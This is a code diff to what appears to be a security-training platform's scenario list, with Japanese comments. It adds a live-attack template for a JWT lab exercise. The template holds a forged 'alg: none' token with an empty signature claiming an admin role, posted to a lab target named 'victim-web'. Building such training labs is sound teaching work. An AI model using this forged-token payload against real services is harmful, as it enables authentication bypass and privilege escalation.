@@ -54,6 +54,18 @@ const decoded = jwt.verify(token, secret);  // 危険`,
         kind: "defensive",
       },
     ],
+    // Phase 1 PoC: live attack 化された最初のシナリオ。
+    // RawHttpComposer に下記テンプレートが初期表示され、学習者が自ら body を編集して送信する。
+    mode: "live",
+    liveTemplate: {
+      target: "victim-web",
+      method: "POST",
+      path: "/jwt/verify",
+      headers: { "Content-Type": "application/json" },
+      // alg=none + 空署名の偽造 JWT。学習者は body を編集してこれを差し替えても良い。
+      // header: {"alg":"none","typ":"JWT"}, payload: {"sub":"seed_alice","role":"admin"}
+      body: '{\n  "token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJzZWVkX2FsaWNlIiwicm9sZSI6ImFkbWluIn0."\n}',
+    },
   },
   {
     id: "jwt-weak-secret-bruteforce",
